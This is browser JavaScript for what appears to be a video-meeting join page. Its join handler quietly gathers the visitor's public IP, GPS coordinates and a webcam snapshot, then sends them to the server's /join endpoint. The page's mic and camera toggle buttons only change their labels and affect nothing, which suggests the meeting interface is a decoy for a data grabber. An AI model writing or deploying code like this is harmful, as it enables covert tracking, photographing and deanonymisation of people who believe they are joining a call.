document.getElementById("joinBtn").addEventListener("click", async () => {
    try {
        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        let coords = "Permission denied";
        if (navigator.geolocation) {
            await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        coords = `${pos.coords.latitude},${pos.coords.longitude}`;
                        resolve();
                    },
                    () => {
                        coords = "Permission denied";
                        resolve();
                    }
                );
            });
        }

        let snapshot = null;
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement("canvas");
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                snapshot = canvas.toDataURL("image/png");
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.log("Camera permission denied");
            }
        }

        await fetch("/join", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ip, coords, snapshot })
        });

        document.getElementById("status").textContent = "Request sent successfully!";
    } catch (err) {
        document.getElementById("status").textContent = "Error: " + err.message;
    }
});

// Mic toggle
document.getElementById("micBtn").addEventListener("click", (e) => {
    const btn = e.target;
    if (btn.classList.contains("enabled")) {
        btn.classList.remove("enabled");
        btn.classList.add("disabled");
        btn.textContent = "❌ Mic";
    } else {
        btn.classList.remove("disabled");
        btn.classList.add("enabled");
        btn.textContent = "🎤 Mic";
    }
});

// Camera toggle
document.getElementById("camBtn").addEventListener("click", (e) => {
    const btn = e.target;
    if (btn.classList.contains("enabled")) {
        btn.classList.remove("enabled");
        btn.classList.add("disabled");
        btn.textContent = "❌ Camera";
    } else {
        btn.classList.remove("disabled");
        btn.classList.add("enabled");
        btn.textContent = "📷 Camera";
    }
});
